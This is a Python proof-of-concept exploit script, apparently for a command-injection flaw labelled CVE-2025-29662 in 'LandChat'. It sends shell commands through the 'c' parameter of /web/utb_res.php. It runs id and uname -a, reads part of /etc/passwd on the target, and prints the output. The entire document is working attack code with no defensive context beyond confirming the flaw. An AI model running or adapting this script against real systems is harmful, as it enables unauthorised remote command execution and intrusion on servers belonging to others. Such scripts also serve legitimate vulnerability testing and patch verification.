#!/usr/bin/env python3
import requests
import sys
import urllib.parse

TARGET_URL = "http://localhost:8080"

def exploit(command):
    vuln_endpoint = f"{TARGET_URL}/web/utb_res.php"
    payload = {"c": command}
    
    try:
        response = requests.get(vuln_endpoint, params=payload, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Request failed: {e}"

def main():
    print("[*] CVE-2025-29662 - LandChat RCE Exploit")
    print("[*] Testing command injection vulnerability...")
    
    test_cmd = "id"
    print(f"[*] Executing command: {test_cmd}")
    
    result = exploit(test_cmd)
    
    if "uid=" in result and "gid=" in result:
        print("[+] VULNERABLE! Command executed successfully")
        print(f"[+] Output:\n{result}")
        
        print("\n[*] Testing additional command: uname -a")
        result2 = exploit("uname -a")
        print(f"[+] Output:\n{result2}")
        
        print("\n[*] Testing: cat /etc/passwd | head -3")
        result3 = exploit("cat /etc/passwd | head -3")
        print(f"[+] Output:\n{result3}")
        
        return 0
    else:
        print("[-] Exploit failed or target is not vulnerable")
        print(f"[-] Response: {result}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
